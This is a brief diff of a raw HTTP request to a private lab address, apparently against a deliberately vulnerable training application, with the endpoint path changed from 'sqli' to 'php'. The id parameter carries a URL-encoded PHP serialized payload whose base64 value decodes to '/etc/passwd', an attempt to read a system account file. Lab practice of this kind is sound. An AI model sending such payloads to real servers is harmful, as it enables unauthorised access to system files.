@@ -1,4 +1,4 @@
-GET /vulnerabilities/sqli/?id=s%3A11%3A%22avatar_link%22%3Bs%3A16%3A%22L2V0Yy9wYXNzd2Q%3D%22&Submit=Submit HTTP/1.1
+GET /vulnerabilities/php/?id=s%3A11%3A%22avatar_link%22%3Bs%3A16%3A%22L2V0Yy9wYXNzd2Q%3D%22&Submit=Submit HTTP/1.1
 Host: 10.10.3.128:2280
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
